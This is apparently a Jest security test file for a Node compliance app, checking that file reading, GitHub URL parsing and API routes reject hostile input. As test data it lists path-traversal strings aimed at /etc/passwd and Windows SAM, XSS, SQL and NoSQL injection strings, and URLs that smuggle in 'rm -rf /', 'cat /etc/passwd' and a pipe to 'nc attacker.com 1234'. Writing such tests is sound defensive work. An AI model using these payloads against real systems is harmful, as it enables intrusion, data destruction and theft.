/**
 * Security Tests
 * Tests for security vulnerabilities and best practices
 */

import { describe, test, expect } from '@jest/globals';
import request from 'supertest';
import { parseGithubUrl, readSampleRepoFile } from '../../lib/compliance.js';

describe('Input Validation Security Tests', () => {
  test('should prevent path traversal in file reading', () => {
    const maliciousInputs = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      './../../.env',
      'file://etc/passwd',
      '/etc/passwd',
      'C:\\Windows\\System32\\config\\sam'
    ];

    maliciousInputs.forEach(input => {
      expect(() => readSampleRepoFile(input)).toThrow();
    });
  });

  test('should prevent directory listing attempts', () => {
    const maliciousInputs = [
      '.',
      '..',
      './',
      '../',
      '.hidden',
      '..hidden'
    ];

    maliciousInputs.forEach(input => {
      expect(() => readSampleRepoFile(input)).toThrow();
    });
  });

  test('should sanitize GitHub URLs', () => {
    const maliciousUrls = [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'file:///etc/passwd',
      'ftp://malicious.com/repo'
    ];

    maliciousUrls.forEach(url => {
      expect(() => parseGithubUrl(url)).toThrow();
    });
  });

  test('should reject URLs with XSS attempts', () => {
    const xssUrls = [
      'https://github.com/<script>alert(1)</script>/repo',
      'https://github.com/user/repo?<img src=x onerror=alert(1)>',
      'https://github.com/user/repo#<svg onload=alert(1)>'
    ];

    xssUrls.forEach(url => {
      // Should either throw or sanitize
      try {
        const result = parseGithubUrl(url);
        expect(result.owner).not.toContain('<script>');
        expect(result.repo).not.toContain('<script>');
      } catch (error) {
        expect(error).toBeDefined();
      }
    });
  });
});

describe('API Key Security Tests', () => {
  test('should not expose API key in error messages', async () => {
    const originalKey = process.env.GEMINI_API_KEY;
    process.env.GEMINI_API_KEY = 'secret-test-key-12345';

    // Import server after setting env var
    const { default: app } = await import('../../server.js');

    const response = await request(app)
      .post('/ask')
      .send({ question: 'test' });

    // Check that API key is not in response
    const responseText = JSON.stringify(response.body);
    expect(responseText).not.toContain('secret-test-key-12345');
    expect(responseText).not.toContain(process.env.GEMINI_API_KEY);

    process.env.GEMINI_API_KEY = originalKey;
  });

  test('should handle missing API key gracefully', async () => {
    const originalKey = process.env.GEMINI_API_KEY;
    delete process.env.GEMINI_API_KEY;

    const { default: app } = await import('../../server.js');

    const response = await request(app)
      .post('/ask')
      .send({ question: 'test' });

    expect(response.status).toBeOneOf([400, 500]);
    expect(response.body).toHaveProperty('answer');
    expect(response.body.answer).toContain('not configured');

    process.env.GEMINI_API_KEY = originalKey;
  });
});

describe('Injection Attack Prevention', () => {
  test('should prevent SQL injection patterns in questions', async () => {
    const { default: app } = await import('../../server.js');
    
    const sqlInjectionAttempts = [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "admin'--",
      "' UNION SELECT * FROM passwords--"
    ];

    for (const injection of sqlInjectionAttempts) {
      const response = await request(app)
        .post('/ask')
        .send({ question: injection });

      // Should handle gracefully without executing SQL
      expect(response.status).toBeOneOf([200, 400, 500]);
    }
  });

  test('should prevent command injection in GitHub URLs', () => {
    const commandInjectionAttempts = [
      'https://github.com/user/repo; rm -rf /',
      'https://github.com/user/repo && cat /etc/passwd',
      'https://github.com/user/repo | nc attacker.com 1234',
      'https://github.com/user/repo`whoami`'
    ];

    commandInjectionAttempts.forEach(url => {
      expect(() => parseGithubUrl(url)).toThrow();
    });
  });

  test('should prevent NoSQL injection patterns', async () => {
    const { default: app } = await import('../../server.js');
    
    const noSqlInjections = [
      { question: { $gt: '' } },
      { question: { $ne: null } },
      { question: { $regex: '.*' } }
    ];

    for (const injection of noSqlInjections) {
      const response = await request(app)
        .post('/ask')
        .send(injection);

      // Should reject or handle safely
      expect(response.status).toBeOneOf([400, 500]);
    }
  });
});

describe('Rate Limiting and DoS Prevention', () => {
  test('should handle extremely large payloads', async () => {
    const { default: app } = await import('../../server.js');
    
    const hugePayload = {
      question: 'x'.repeat(10 * 1024 * 1024), // 10MB
      frameworks: Array(10000).fill('PCI-DSS')
    };

    const response = await request(app)
      .post('/ask')
      .send(hugePayload);

    // Should reject or handle gracefully
    expect(response.status).toBeOneOf([400, 413, 500]);
  });

  test('should handle deeply nested objects', async () => {
    const { default: app } = await import('../../server.js');
    
    // Create deeply nested object
    let nested = { question: 'test' };
    for (let i = 0; i < 100; i++) {
      nested = { nested };
    }

    const response = await request(app)
      .post('/ask')
      .send(nested);

    expect(response.status).toBeOneOf([400, 500]);
  });
});

describe('Information Disclosure Prevention', () => {
  test('should not expose internal file paths in errors', async () => {
    const { default: app } = await import('../../server.js');
    
    const response = await request(app)
      .post('/modernize')
      .send({ filename: 'nonexistent.js' });

    const responseText = JSON.stringify(response.body);
    
    // Should not expose full system paths
    expect(responseText).not.toMatch(/C:\\Users\\/);
    expect(responseText).not.toMatch(/\/home\//);
    expect(responseText).not.toMatch(/\/var\//);
  });

  test('should not expose stack traces in production', async () => {
    const originalEnv = process.env.NODE_ENV;
    process.env.NODE_ENV = 'production';

    const { default: app } = await import('../../server.js');
    
    const response = await request(app)
      .post('/ask')
      .send({ invalid: 'data' });

    const responseText = JSON.stringify(response.body);
    
    // Should not contain stack trace keywords
    expect(responseText).not.toContain('at Object.');
    expect(responseText).not.toContain('at Module.');
    expect(responseText).not.toContain('.js:');

    process.env.NODE_ENV = originalEnv;
  });
});

describe('CORS and Headers Security', () => {
  test('should have secure headers', async () => {
    const { default: app } = await import('../../server.js');
    
    const response = await request(app).get('/');

    // Check for security headers (if implemented)
    // These are recommendations for production
    const headers = response.headers;
    
    // Document current state
    expect(headers).toBeDefined();
  });

  test('should handle OPTIONS requests', async () => {
    const { default: app } = await import('../../server.js');
    
    const response = await request(app)
      .options('/ask');

    // Should handle CORS preflight
    expect(response.status).toBeOneOf([200, 204, 404]);
  });
});

describe('File Upload Security (if applicable)', () => {
  test('should reject files with dangerous extensions', () => {
    const dangerousExtensions = [
      '.exe',
      '.bat',
      '.cmd',
      '.sh',
      '.ps1',
      '.dll',
      '.so'
    ];

    dangerousExtensions.forEach(ext => {
      expect(() => readSampleRepoFile(`malicious${ext}`)).toThrow();
    });
  });

  test('should validate file size limits', () => {
    // Test that file reading has reasonable limits
    const files = ['auth.js', 'users.js'];
    
    files.forEach(file => {
      const content = readSampleRepoFile(file);
      // Reasonable file size check
      expect(content.length).toBeLessThan(1024 * 1024); // 1MB
    });
  });
});

describe('Authentication and Authorization (if applicable)', () => {
  test('should not expose sensitive configuration', async () => {
    const { default: app } = await import('../../server.js');
    
    const response = await request(app).get('/');
    const html = response.text;

    // Should not expose sensitive data in HTML
    expect(html).not.toContain(process.env.GEMINI_API_KEY || '');
    expect(html).not.toContain('GEMINI_API_KEY');
    expect(html).not.toContain('secret');
    expect(html).not.toContain('password');
  });
});

// Custom matcher
expect.extend({
  toBeOneOf(received, expected) {
    const pass = expected.includes(received);
    return {
      pass,
      message: () => `expected ${received} to be one of ${expected.join(', ')}`
    };
  }
});

// Made with Bob